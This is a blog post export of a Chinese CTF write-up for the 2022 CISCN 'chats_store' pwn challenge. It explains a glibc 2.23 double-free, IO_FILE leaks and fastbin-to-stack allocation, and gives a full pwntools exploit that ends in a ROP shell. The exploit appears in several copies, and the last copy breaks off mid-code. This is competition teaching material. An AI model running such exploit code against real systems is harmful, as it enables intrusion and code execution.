{"title":"[2022CISCN]华南赛区分区赛 部分Pwn wp","date":"2022-06-21T08:15:02.000Z","toc":true,"source":"_posts/2022CISCN-hn-wp.md","raw":"---\ntitle: \"[2022CISCN]华南赛区分区赛 部分Pwn wp\"\ncomments: true\ntoc: true\ndate: 2022-06-21 16:15:02\ntags: \n  - CTF\n  - Pwn\n  - CISCN\n---\n\n# chats_store\n\n## 题目\n\nhttps://gitee.com/csomebro/ctftask/blob/master/2022-06_CISCN/pwn.zip\n\n## 解题思路\n\n堆题，libc版本为2.23没有tcache，观察free逻辑发现存在uaf和doublefree，由于没有edit和show故使用IO_FILE Attack泄露libc基址。\n\n![image-20220621162136685](2022CISCN-hn-wp/image-20220621162136685.png)\n\n泄露成功后就是常规的fastbin attack打__malloc_hook，但是经过测试，one_gadget一个都打不通，所以，不能采用ogg的方法。想到rop方法，构造system(\"/bin/sh\")，需要泄露栈地址故再次利用IO_FILE泄露environ中存的栈地址，之后构造偏移量将fastbin分配到栈上，最后写入ROP实现getshell\n\n## EXP\n\n```python\nfrom pwn import *\nimport time\n\n# getIO = lambda: process(['./ld-2.23.so', './chats_store'], env={'LD_PRELOAD':'./libc-2.23.so'})\ngetIO = lambda: remote('43.138.52.3', 59000)\ncontext.log_level='debug'\nio = getIO()\n\ndef add(idx, size, content):\n    io.sendlineafter('> ', '1')\n    tmp = str(idx)\n    tmp += (8 - len(tmp)) * '\\x00'\n    io.sendafter('chats No. > ', tmp)\n    io.sendlineafter('size> ', str(size))\n    io.sendafter('chats> ', content)\n    # time.sleep(0.5)\n\ndef free(idx):\n    io.sendlineafter('> ', '2')\n    io.sendlineafter('chats No. > ', str(idx))\n\nwhile 1:\n    add(0, 0x28, 'aaaa')\n    add(1, 0x68, 'aaaa')\n    add(11, 0x68, 'aaaaa')\n    add(12, 0x28, 'aaa')\n    free(0)\n    add(0, 0x28, 'a'*0x28+'\\xe1')\n    free(1)\n    add(0, 0x68, '\\xdd\\x15')\n\n    add(20, 0x68, 'aaaa') # b\n    add(21, 0x68, 'aaaa') # a\n    add(22, 0x28, 'aaaa')\n    free(21)\n    free(20)\n    free(21)\n\n    add(21, 0x68, '\\x30')\n    add(22, 0x68, 'aaaa')\n    add(23, 0x68, 'aaaa')\n    add(24, 0x68, 'aaaa')\n    flag = 0xfbad1800\n    try: \n        add(25, 0x68, '\\x00'*0x33 + p64(flag) + p64(0)*3 +'\\x48')\n        inp = io.recv(200, timeout=2)\n        log.success('inp:'+inp)\n        break\n        _IO_2_stdout_ = u64(inp)\n        log.success('_IO_2_stdout_:'+hex(_IO_2_stdout_))\n        break\n    except:\n        io.close()\n        io = getIO()\n\ninp = io.recvuntil('\\x7f').ljust(8, '\\x00')\n_IO_2_stdout_ = u64(inp)\nlog.success('_IO_2_stdout_:'+hex(_IO_2_stdout_))\nlibc_base = _IO_2_stdout_ - 0x3c56a3 \nlog.success('libc_base:'+hex(libc_base))\n\nstdout_addr = libc_base + 0x3c55dd \nenviron = libc_base + 0x003C6F38  \nadd(20, 0x68, 'aaaa') # b\nadd(21, 0x68, 'aaaa') # a\nadd(22, 0x28, 'aaaa')\nfree(21)\nfree(20)\nfree(21)\nadd(21, 0x68, p64(stdout_addr))\nadd(22, 0x68, 'aaaa')\nadd(23, 0x68, 'aaaa')\nadd(24, 0x68,  '\\x00'*0x33 + p64(flag) + p64(0)*3 +p64(environ) + p64(environ+0x10)*2)\nstack_addr =  u64(io.recv(8))\nlog.success('stack_addr:'+hex(stack_addr))\n\n\n\n\n# add(32, 0x68, 'aaaa')\n\ntarget = stack_addr - 0x163 - 8  \nadd(20, 0x68, 'aaaa') # b\nadd(21, 0x68, 'aaaa') # a\nadd(22, 0x28, 'aaaa')\nfree(21)\nfree(20)\nfree(21)\nadd(21, 0x68, p64(target))\nadd(22, 0x68, 'aaaa')\nadd(23, 0x68, 'aaaa')\n\nlibc = ELF('./libc-2.23.so')\npop_rdi = 0x0000000000021112 + libc_base\nsys_addr = libc.sym['system'] + libc_base\nbinsh = 0x0018CE57 + libc_base\n\nropp = p64(pop_rdi) + p64(binsh) + p64(sys_addr)\n\n# gdb.attach(io)\n\nadd(24, 0x68, 'a' * 0x43 + ropp)\n\n# add(20, 0x68, 'aaaa') # b\n# add(21, 0x68, 'aaaa') # a\n# add(22, 0x28, 'aaaa')\n# free(21)\n# free(20)\n# free(21)\n# add(21, 0x68, p64(stdout_addr))\n# add(22, 0x68, 'aaaa')\n# add(23, 0x68, 'aaaa')\n# add(24, 0x68,  '\\x00'*0x33 + p64(flag) + p64(0)*3 +p64(target) + p64(target+0x100)*2)\n\nio.interactive()\n```\n\n## getFlag\n\n![image-20220621162605176](2022CISCN-hn-wp/image-20220621162605176.png)\n\n\n\n","slug":"2022CISCN-hn-wp","published":true,"updated":"2025-10-28T08:00:40.720Z","_id":"cuidrgOnbsQTavXfynMdmVzOo","comments":true,"layout":"post","photos":[],"html":"<h1 id=\"chats-store\"><a href=\"#chats-store\" class=\"headerlink\" title=\"chats_store\"></a>chats_store</h1><h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-06_CISCN/pwn.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-06_CISCN/pwn.zip</a></p>\n<h2 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h2><p>堆题，libc版本为2.23没有tcache，观察free逻辑发现存在uaf和doublefree，由于没有edit和show故使用IO_FILE Attack泄露libc基址。</p>\n<p><img src=\"/p/2022CISCN-hn-wp/image-20220621162136685.png\" alt=\"image-20220621162136685\"></p>\n<p>泄露成功后就是常规的fastbin attack打__malloc_hook，但是经过测试，one_gadget一个都打不通，所以，不能采用ogg的方法。想到rop方法，构造system(“&#x2F;bin&#x2F;sh”)，需要泄露栈地址故再次利用IO_FILE泄露environ中存的栈地址，之后构造偏移量将fastbin分配到栈上，最后写入ROP实现getshell</p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># getIO = lambda: process([&#x27;./ld-2.23.so&#x27;, &#x27;./chats_store&#x27;], env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\">getIO = <span class=\"keyword\">lambda</span>: remote(<span class=\"string\">&#x27;43.138.52.3&#x27;</span>, <span class=\"number\">59000</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">io = getIO()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx, size, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    tmp = <span class=\"built_in\">str</span>(idx)</span><br><span class=\"line\">    tmp += (<span class=\"number\">8</span> - <span class=\"built_in\">len</span>(tmp)) * <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;chats No. &gt; &#x27;</span>, tmp)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;size&gt; &#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;chats&gt; &#x27;</span>, content)</span><br><span class=\"line\">    <span class=\"comment\"># time.sleep(0.5)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;chats No. &gt; &#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">    add(<span class=\"number\">0</span>, <span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">1</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">11</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">12</span>, <span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\">    free(<span class=\"number\">0</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0</span>, <span class=\"number\">0x28</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+<span class=\"string\">&#x27;\\xe1&#x27;</span>)</span><br><span class=\"line\">    free(<span class=\"number\">1</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;\\xdd\\x15&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    add(<span class=\"number\">20</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># b</span></span><br><span class=\"line\">    add(<span class=\"number\">21</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># a</span></span><br><span class=\"line\">    add(<span class=\"number\">22</span>, <span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">    free(<span class=\"number\">21</span>)</span><br><span class=\"line\">    free(<span class=\"number\">20</span>)</span><br><span class=\"line\">    free(<span class=\"number\">21</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    add(<span class=\"number\">21</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;\\x30&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">22</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">23</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">24</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">    flag = <span class=\"number\">0xfbad1800</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>: </span><br><span class=\"line\">        add(<span class=\"number\">25</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>*<span class=\"number\">0x33</span> + p64(flag) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> +<span class=\"string\">&#x27;\\x48&#x27;</span>)</span><br><span class=\"line\">        inp = io.recv(<span class=\"number\">200</span>, timeout=<span class=\"number\">2</span>)</span><br><span class=\"line\">        log.success(<span class=\"string\">&#x27;inp:&#x27;</span>+inp)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">        _IO_2_stdout_ = u64(inp)</span><br><span class=\"line\">        log.success(<span class=\"string\">&#x27;_IO_2_stdout_:&#x27;</span>+<span class=\"built_in\">hex</span>(_IO_2_stdout_))</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        io.close()</span><br><span class=\"line\">        io = getIO()</span><br><span class=\"line\"></span><br><span class=\"line\">inp = io.recvuntil(<span class=\"string\">&#x27;\\x7f&#x27;</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">_IO_2_stdout_ = u64(inp)</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;_IO_2_stdout_:&#x27;</span>+<span class=\"built_in\">hex</span>(_IO_2_stdout_))</span><br><span class=\"line\">libc_base = _IO_2_stdout_ - <span class=\"number\">0x3c56a3</span> </span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;libc_base:&#x27;</span>+<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\">stdout_addr = libc_base + <span class=\"number\">0x3c55dd</span> </span><br><span class=\"line\">environ = libc_base + <span class=\"number\">0x003C6F38</span>  </span><br><span class=\"line\">add(<span class=\"number\">20</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># b</span></span><br><span class=\"line\">add(<span class=\"number\">21</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># a</span></span><br><span class=\"line\">add(<span class=\"number\">22</span>, <span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">21</span>)</span><br><span class=\"line\">free(<span class=\"number\">20</span>)</span><br><span class=\"line\">free(<span class=\"number\">21</span>)</span><br><span class=\"line\">add(<span class=\"number\">21</span>, <span class=\"number\">0x68</span>, p64(stdout_addr))</span><br><span class=\"line\">add(<span class=\"number\">22</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">23</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">24</span>, <span class=\"number\">0x68</span>,  <span class=\"string\">&#x27;\\x00&#x27;</span>*<span class=\"number\">0x33</span> + p64(flag) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> +p64(environ) + p64(environ+<span class=\"number\">0x10</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\">stack_addr =  u64(io.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;stack_addr:&#x27;</span>+<span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># add(32, 0x68, &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">target = stack_addr - <span class=\"number\">0x163</span> - <span class=\"number\">8</span>  </span><br><span class=\"line\">add(<span class=\"number\">20</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># b</span></span><br><span class=\"line\">add(<span class=\"number\">21</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># a</span></span><br><span class=\"line\">add(<span class=\"number\">22</span>, <span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">21</span>)</span><br><span class=\"line\">free(<span class=\"number\">20</span>)</span><br><span class=\"line\">free(<span class=\"number\">21</span>)</span><br><span class=\"line\">add(<span class=\"number\">21</span>, <span class=\"number\">0x68</span>, p64(target))</span><br><span class=\"line\">add(<span class=\"number\">22</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">23</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x0000000000021112</span> + libc_base</span><br><span class=\"line\">sys_addr = libc.sym[<span class=\"string\">&#x27;system&#x27;</span>] + libc_base</span><br><span class=\"line\">binsh = <span class=\"number\">0x0018CE57</span> + libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">ropp = p64(pop_rdi) + p64(binsh) + p64(sys_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">24</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x43</span> + ropp)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># add(20, 0x68, &#x27;aaaa&#x27;) # b</span></span><br><span class=\"line\"><span class=\"comment\"># add(21, 0x68, &#x27;aaaa&#x27;) # a</span></span><br><span class=\"line\"><span class=\"comment\"># add(22, 0x28, &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># free(21)</span></span><br><span class=\"line\"><span class=\"comment\"># free(20)</span></span><br><span class=\"line\"><span class=\"comment\"># free(21)</span></span><br><span class=\"line\"><span class=\"comment\"># add(21, 0x68, p64(stdout_addr))</span></span><br><span class=\"line\"><span class=\"comment\"># add(22, 0x68, &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># add(23, 0x68, &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># add(24, 0x68,  &#x27;\\x00&#x27;*0x33 + p64(flag) + p64(0)*3 +p64(target) + p64(target+0x100)*2)</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"getFlag\"><a href=\"#getFlag\" class=\"headerlink\" title=\"getFlag\"></a>getFlag</h2><p><img src=\"/p/2022CISCN-hn-wp/image-20220621162605176.png\" alt=\"image-20220621162605176\"></p>\n","excerpt":"","more":"<h1 id=\"chats-store\"><a href=\"#chats-store\" class=\"headerlink\" title=\"chats_store\"></a>chats_store</h1><h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-06_CISCN/pwn.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-06_CISCN/pwn.zip</a></p>\n<h2 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h2><p>堆题，libc版本为2.23没有tcache，观察free逻辑发现存在uaf和doublefree，由于没有edit和show故使用IO_FILE Attack泄露libc基址。</p>\n<p><img src=\"/p/2022CISCN-hn-wp/image-20220621162136685.png\" alt=\"image-20220621162136685\"></p>\n<p>泄露成功后就是常规的fastbin attack打__malloc_hook，但是经过测试，one_gadget一个都打不通，所以，不能采用ogg的方法。想到rop方法，构造system(“&#x2F;bin&#x2F;sh”)，需要泄露栈地址故再次利用IO_FILE泄露environ中存的栈地址，之后构造偏移量将fastbin分配到栈上，最后写入ROP实现getshell</p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># getIO = lambda: process([&#x27;./ld-2.23.so&#x27;, &#x27;./chats_store&#x27;], env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\">getIO = <span class=\"keyword\">lambda</span>: remote(<span class=\"string\">&#x27;43.138.52.3&#x27;</span>, <span class=\"number\">59000</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">io = getIO()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx, size, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    tmp = <span class=\"built_in\">str</span>(idx)</span><br><span class=\"line\">    tmp += (<span class=\"number\">8</span> - <span class=\"built_in\">len</span>(tmp)) * <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;chats No. &gt; &#x27;</span>, tmp)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;size&gt; &#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;chats&gt; &#x27;</span>, content)</span><br><span class=\"line\">    <span class=\"comment\"># time.sleep(0.5)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;chats No. &gt; &#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">    add(<span class=\"number\">0</span>, <span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">1</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">11</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">12</span>, <span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\">    free(<span class=\"number\">0</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0</span>, <span class=\"number\">0x28</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+<span class=\"string\">&#x27;\\xe1&#x27;</span>)</span><br><span class=\"line\">    free(<span class=\"number\">1</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;\\xdd\\x15&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    add(<span class=\"number\">20</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># b</span></span><br><span class=\"line\">    add(<span class=\"number\">21</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># a</span></span><br><span class=\"line\">    add(<span class=\"number\">22</span>, <span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">    free(<span class=\"number\">21</span>)</span><br><span class=\"line\">    free(<span class=\"number\">20</span>)</span><br><span class=\"line\">    free(<span class=\"number\">21</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    add(<span class=\"number\">21</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;\\x30&#x27;</span>)</span><br><span class=\"line\">    add(<span 